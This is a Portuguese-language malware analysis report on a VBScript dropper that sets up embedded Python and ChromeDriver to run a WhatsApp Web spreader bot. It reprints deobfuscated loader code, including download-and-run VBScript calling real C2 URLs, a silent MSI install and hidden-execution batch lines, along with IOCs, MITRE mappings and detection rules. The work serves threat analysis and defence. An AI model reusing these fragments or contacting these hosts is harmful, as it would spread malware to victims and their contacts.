# 🧬 Malware Analysis — WhatsApp Web Spreader via VBS + Python + ChromeDriver

> **Type:** Malware Reverse Engineering — Threat Analysis Report
> **Sample:** `om5ulwy9r1i7.vbs` (7z protegido com senha `infected`)
> **Classification:** Worm / Social Engineering Bot / Backdoor Dropper
> **C2 Hosts:** `empautlipa.com` · `215.176.153.160.host.secureserver.net`
> **Platforms:** Windows x64
> **Analysis:** Manual deobfuscation via arithmetic array decode

---

## `$ cat ./summary.txt`

Malware de múltiplos estágios com **duas cadeias de execução distintas**, selecionadas aleatoriamente (50/50) em runtime. O vetor inicial é um VBScript altamente ofuscado que, ao executar, sorteia entre: (A) instalar um MSI de backdoor e montar ambiente Python ou (B) baixar um ZIP contendo um LNK malicioso e depois instalar o ambiente Python. Em ambos os caminhos, o objetivo final é executar `whats.py` (originalmente `vbiud.py`) com `pythonw.exe` — um script de automação do WhatsApp Web que replica o malware enviando mensagens falsas pelos contatos da vítima.

---

## `$ cat ./deobfuscation.md`

### Técnica: Array-based Character Encoding com Aritmética Redundante

O payload real do VBS está inteiramente codificado como um array de inteiros com expressões aritméticas que se cancelam:

```vbscript
' Padrão observado:
VrtfK65zCUXWZAP = Array(79, 112+85-85, 116+78-78, 105, 111, ...)
'                              ↑
'               112+85-85 = 112 — operações se cancelam, valor real é 112
'               Chr(112) = 'p'
```

O loop decodifica cada `Chr()` em runtime e executa o resultado com `Execute`:
```vbscript
For TVDWe8shdPzcR = 0 To UBound(VrtfK65zCUXWZAP)
    JeE8OELZn0z = JeE8OELZn0z & Chr(VrtfK65zCUXWZAP(TVDWe8shdPzcR))
Next
Execute JeE8OELZn0z   ' payload real nunca toca o disco como texto legível
```

**Resultado da deobfuscação:** 10.589 caracteres de VBScript legível com duas subroutines e duas funções distintas.

---

## `$ cat ./attack_flow.txt`

```
┌──────────────────────────────────────────────────────────────────────────┐
│               ATTACK CHAIN — DUAL EXECUTION PATH                         │
│                                                                          │
│  STAGE 1: DELIVERY                                                       │
│  om5ulwy9r1i7.vbs ──► WScript.exe                                        │
│                        │ deobfusca array em memória                      │
│                        │ Execute JeE8OELZn0z                             │
│                        │                                                  │
│  STAGE 2: RANDOM BRANCH (Randomize → Int(2 * Rnd))                       │
│                        │                                                  │
│           ┌────────────┴────────────┐                                    │
│   [Rnd=0] │                         │ [Rnd=1]                            │
│           ▼                         ▼                                    │
│    ExecutarMSI()          BaixarZipEExecLnk()                            │
│           │               ("215.176.153.160...")                          │
│           │                         │                                    │
│           │               Baixa ZIP via MSXML2.XMLHTTP                   │
│           │               Extrai em %TEMP%\VBS_Exec_[rand]               │
│           │               Busca recursivamente .lnk                      │
│           │               Executa o .lnk encontrado                      │
│           │                         │                                    │
│           │               InstalarPythonEDependencias()                  │
│           │                         │                                    │
│           └────────────┬────────────┘                                    │
│                        ▼                                                  │
│  STAGE 3: SETUP (C:\temp\instalar.bat ou python_install.bat)             │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │  [1] MSI:     empautlipa.com/altor/installer.msi                 │    │
│  │               msiexec.exe /i instalador.msi /qn /norestart      │    │
│  │                                                                  │    │
│  │  [2] Python:  python.org/ftp/python/3.12.7/...-embed-amd64.zip  │    │
│  │               Expand-Archive python.zip . -Force                 │    │
│  │               Cria python312._pth (path config)                  │    │
│  │                                                                  │    │
│  │  [3] Chrome:  googlechromelabs.github.io (JSON de versões)       │    │
│  │               Detecta versão do Chrome na vítima                 │    │
│  │               Baixa chromedriver compatível                      │    │
│  │               Fallback: chromedriver 130.0.6723.93               │    │
│  │                                                                  │    │
│  │  [4] pip:     bootstrap.pypa.io/get-pip.py                       │    │
│  │               pip install setuptools wheel pywin32                │    │
│  │               pip install requests Pillow numpy opencv-python     │    │
│  │               pip install pyautogui keyboard mouse pygetwindow    │    │
│  │               pip install pytesseract selenium packaging          │    │
│  │                          webdriver-manager                        │    │
│  │                                                                  │    │
│  │  [5] Payload: empautlipa.com/altor/vbiud.py → whats.py           │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                        │                                                  │
│  STAGE 4: EXECUTION (oculta)                                             │
│  pythonw.exe whats.py  ──► ChromeDriver ──► web.whatsapp.com            │
│  [sem console]              [Selenium]       [conta da vítima]            │
│                                              [envia mensagens falsas]    │
│                                                                          │
│  STAGE 5: CLEANUP                                                        │
│  objFSO.DeleteFile strBatFile  (bat auto-deleta após execução)           │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## `$ cat ./stage_analysis.md`

### Stage 2A — `ExecutarMSI()`: Path do MSI

```vbscript
strMsiUrl = "https://empautlipa.com/altor/installer.msi"
' Escreve instalar.bat em C:\temp\
objShell.Run strBatFile, 0, True   ' 0 = janela oculta
objFSO.DeleteFile strBatFile       ' auto-deleta o .bat
```

O batch é gerado dinamicamente em memória, escrito em `C:\temp\instalar.bat`, executado com janela **oculta** (`WindowStyle = 0`), e deletado logo após. Não existe no disco por mais de alguns segundos.

O MSI é instalado silenciosamente: `/qn /norestart` — sem UI, sem reboot. Função desconhecida (potencial backdoor persistente), pois o arquivo não estava acessível durante a análise.

---

### Stage 2B — `BaixarZipEExecLnk()`: Path do LNK

```vbscript
BaixarZipEExecLnk "https://215.176.153.160.host.secureserver.net/986495423y5o2/986fdg9/202529834759629"
```

**C2 secundário descoberto via deobfuscação** — não visível no fluxo do PDF original. Hospedado em `secureserver.net` (GoDaddy), com path obfuscado numericamente.

```vbscript
' Download via MSXML2.XMLHTTP (não via PowerShell — mais furtivo)
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", urlZip, False
objHTTP.Send

' Salva via ADODB.Stream (bytes brutos, sem passar por shell)
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1    ' binário
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile caminhoZip, 2

' Extrai e executa o .lnk encontrado recursivamente
caminhoLnk = ProcurarArquivoLnk(pastaDestino)
objShell.Run caminhoLnk, 1, False
```

**Técnica de download via COM** (MSXML2.XMLHTTP + ADODB.Stream) — alternativa ao `Invoke-WebRequest` do PowerShell, que pode ser bloqueado por políticas de execução. Operações feitas inteiramente em VBScript via COM objects nativos do Windows.

O LNK extraído do ZIP serve como **segundo estágio de execução** — possivelmente outro dropper ou o próprio `instalar.bat` empacotado.

---

### Stage 3 — Python Environment: Detalhes Técnicos

**Python 3.12.7 embedded** — versão específica, não a mais recente. O embedded package não requer instalação, não cria entradas no registry, e funciona de qualquer diretório:

```batch
rem Configuração do path file para Python embedded funcionar com pip
(
echo python312.zip
echo .
echo Lib
echo Lib\site-packages
echo import site
) > python312._pth
```

O `python312._pth` é necessário porque o Python embedded **não carrega** o `site` module por padrão, o que impede que o pip funcione. Sem esse arquivo, `pip install` falha silenciosamente. O malware conhece esse detalhe técnico — indica um desenvolvedor familiarizado com Python packaging.

**Stack completo de bibliotecas:**

| Grupo | Pacotes | Capacidade |
|-------|---------|-----------|
| Core | `setuptools wheel pywin32` | Build + APIs Win32 |
| Vision | `Pillow numpy opencv-python pytesseract` | Screenshots, OCR, detecção visual |
| Automation | `pyautogui keyboard mouse pygetwindow` | Mouse, teclado, janelas |
| Browser | `selenium packaging webdriver-manager` | Controle total de browser |
| Network | `requests` | HTTP/HTTPS |

`pytesseract` (OCR) + `opencv` sugere que o script pode **ler texto de imagens na tela** — útil para identificar QR codes ou elementos do WhatsApp Web que não são acessíveis via DOM.

---

### Stage 4 — Execução Oculta

```batch
start "" /b pythonw.exe whats.py
```

- `pythonw.exe` — variante do Python **sem console** (w = windowless)
- `/b` — executa em background, desacoplado do processo pai
- `"" ` — título vazio da janela (não aparece na barra de tarefas)

O processo `pythonw.exe` roda inteiramente invisível para o usuário. Sem popup, sem janela, sem notificação.

---

## `$ cat ./iocs.txt`

```yaml
# INDICATORS OF COMPROMISE — COMPLETOS (pós-deobfuscação)

network:
  domains:
    - empautlipa.com                                        # C2 principal
    - 215.176.153.160.host.secureserver.net                 # C2 secundário (GoDaddy)

  urls:
    - https://empautlipa.com/altor/installer.msi            # Backdoor MSI
    - https://empautlipa.com/altor/vbiud.py                 # WhatsApp bot script
    - https://215.176.153.160.host.secureserver.net/986495423y5o2/986fdg9/202529834759629
                                                            # LNK ZIP (C2 secundário)
    - https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip
    - https://storage.googleapis.com/chrome-for-testing-public/130.0.6723.93/win64/chromedriver-win64.zip
    - https://bootstrap.pypa.io/get-pip.py
    - https://googlechromelabs.github.io/chrome-for-testing/known-good-versions-with-downloads.json

filesystem:
  paths:
    - C:\temp\                                              # Diretório de trabalho
    - C:\temp\instalar.bat                                  # Bat auto-deletado
    - C:\temp\python_install.bat                            # Bat auto-deletado
    - C:\temp\python.exe                                    # Python embedded
    - C:\temp\chromedriver.exe                              # ChromeDriver
    - C:\temp\whats.py                                      # WhatsApp bot (vbiud.py)
    - C:\temp\python312._pth                                # Config Python embedded
    - %TEMP%\VBS_Exec_[0-99999]\                            # Dir temporário LNK
    - %TEMP%\VBS_Exec_[0-99999]\*.lnk                      # LNK malicioso extraído

  filenames:
    - om5ulwy9r1i7.vbs                                      # Dropper inicial
    - instalar.bat                                          # Setup script (auto-delete)
    - python_install.bat                                    # Setup script (auto-delete)
    - whats.py                                              # Bot final (= vbiud.py)
    - installer.msi                                         # Backdoor MSI

process:
  chain:
    - wscript.exe → [payload em memória] → powershell.exe / cmd.exe
    - cmd.exe instalar.bat → python.exe / msiexec.exe / powershell.exe
    - python.exe → pythonw.exe whats.py
    - pythonw.exe → chromedriver.exe → chrome.exe
  
  hidden_execution:
    - pythonw.exe whats.py     # sem console, background
    - msiexec.exe /qn          # silencioso
    - wscript.exe WindowStyle=0 # janela oculta

  com_objects:
    - WScript.Shell
    - Scripting.FileSystemObject
    - MSXML2.XMLHTTP            # download furtivo sem PowerShell
    - ADODB.Stream              # escrita binária sem shell
    - Shell.Application         # extração de ZIP sem 7zip/PowerShell
```

---

## `$ cat ./mitre_mapping.yml`

```yaml
tactic: Initial Access
  - T1566.001   # Phishing: Spearphishing Attachment (VBS entregue via link/anexo)
  - T1204.002   # User Execution: Malicious File (usuário executa o .vbs)

tactic: Execution
  - T1059.005   # VBScript via WScript.exe
  - T1059.001   # PowerShell (Invoke-WebRequest, Expand-Archive)
  - T1059.003   # cmd / batch (instalar.bat, python_install.bat)
  - T1218.007   # LOLBin: Msiexec /qn (execução silenciosa de MSI)
  - T1559.001   # COM Objects (MSXML2.XMLHTTP, ADODB.Stream, Shell.Application)

tactic: Defense Evasion
  - T1027.010   # Obfuscation: Array encoding com aritmética redundante
  - T1027       # Payload executado apenas em memória (Execute JeE8OELZn0z)
  - T1070.004   # Indicator Removal: File Deletion (bat auto-deleta após execução)
  - T1036       # Masquerading: pythonw.exe sem console, WindowStyle=0
  - T1553       # Uso de infraestrutura legítima (python.org, GitHub, PyPI)

tactic: Persistence
  - T1547       # Autostart via installer.msi (comportamento não confirmado sem análise do MSI)

tactic: Command and Control
  - T1102       # Web Service: empautlipa.com + secureserver.net
  - T1071.001   # HTTPS para downloads e C2
  - T1008       # Fallback Channels: C2 primário + secundário + chromedriver hardcoded

tactic: Collection
  - T1113       # Screen Capture (opencv-python + Pillow)
  - T1056.001   # Keylogging (keyboard library)
  - T1560.001   # Archive Collected Data (potencial via pywin32)

tactic: Lateral Movement / Impact
  - T1534       # Internal Spearphishing via WhatsApp Web (conta da vítima envia para contatos)
```

---

## `$ cat ./detection_opportunities.md`

```yaml
# WScript.exe em execução em diretórios não-usuais ou com args suspeitos
EventID: 1 (Sysmon)
Condição:
  Image: wscript.exe
  CommandLine CONTAINS: .vbs
  ParentImage NOT IN: [explorer.exe, outlook.exe]   # fora de abertura manual
Severidade: MÉDIA

# COM Object MSXML2.XMLHTTP fazendo download (alternativa a PS)
EventID: 3 (Sysmon Network)
Condição:
  Initiated: true
  Image: wscript.exe
  DestinationHostname NOT IN: [whitelist interna]
Severidade: ALTA

# msiexec silencioso a partir de C:\temp (não de %ProgramFiles%)
EventID: 1 (Sysmon)
Condição:
  Image: msiexec.exe
  CommandLine CONTAINS: /qn
  CommandLine CONTAINS: C:\temp
Severidade: ALTA

# pythonw.exe spawna chromedriver (não esperado fora de ambientes dev)
EventID: 1 (Sysmon)
Condição:
  ParentImage: *pythonw.exe
  Image: *chromedriver.exe
Severidade: CRÍTICA

# Criação de python312._pth em diretório não-padrão
EventID: 11 (Sysmon File Create)
Condição:
  TargetFilename CONTAINS: python312._pth
  TargetFilename NOT CONTAINS: \Python3
Severidade: ALTA

# Conexão a empautlipa.com ou secureserver.net com path numérico suspeito
DNS/Proxy:
  domains: [empautlipa.com, 215.176.153.160.host.secureserver.net]
Severidade: CRÍTICA
```

---

## `$ cat ./new_findings.md`

> Descobertas encontradas **exclusivamente via deobfuscação** — não visíveis no fluxo original do PDF.

```
[!] DUPLO CAMINHO DE INFECÇÃO: sorteio aleatório 50/50 entre MSI e LNK em cada execução
    → Dificulta análise comportamental baseada em sandbox (execução pode variar)

[!] C2 SECUNDÁRIO: 215.176.153.160.host.secureserver.net
    → GoDaddy hosting, path obfuscado numericamente
    → Entrega ZIP contendo LNK malicioso não analisado

[!] DOWNLOAD VIA COM (MSXML2.XMLHTTP + ADODB.Stream)
    → Evita PowerShell (que pode ser bloqueado por política)
    → Opera inteiramente em VBScript nativo do Windows

[!] AUTO-DELETE de artefatos intermediários
    → instalar.bat e python_install.bat são deletados logo após execução
    → Reduz artefatos forenses em disco

[!] PYTESSERACT (OCR) no stack de bibliotecas
    → Capacidade de ler texto de imagens na tela
    → Potencialmente usado para interagir com QR code ou elementos visuais do WhatsApp

[!] PYTHON VERSION PINNING: 3.12.7 específico
    → Indica malware testado e desenvolvido com essa versão
    → Pode ser IOC em inventário de software
```

---

## `$ cat ./lessons_learned.txt`

```
[+] Deobfuscação manual do array revelou ~4x mais informação que análise estática
[+] 50/50 branching é técnica anti-sandbox eficaz — execução varia entre análises
[+] COM objects (MSXML2/ADODB) como alternativa ao PowerShell são menos monitorados
[+] python312._pth é IOC único e específico — raramente encontrado em ambientes legítimos
[+] pythonw.exe sem console + /b = execução invisível mesmo para usuários atentos
[+] Dois C2 independentes aumentam resiliência — se um cair, outro serve
[+] Stack OCR (pytesseract+opencv) sugere capacidades além do WhatsApp automation
[-] installer.msi não foi analisado — comportamento de backdoor não confirmado
[-] vbiud.py (whats.py) não estava nas evidências — mecanismo de propagação WA não detalhado
[-] LNK dentro do ZIP do C2 secundário não foi recuperado — segundo vetor incompleto
[-] Randonização impede reprodução determinística do fluxo completo em lab
```

---

<p align="center">
  <i>Malware Analysis · VBScript Deobfuscated · Dual C2 · LNK + MSI Dropper · WhatsApp Bot · MITRE ATT&CK</i>
</p>
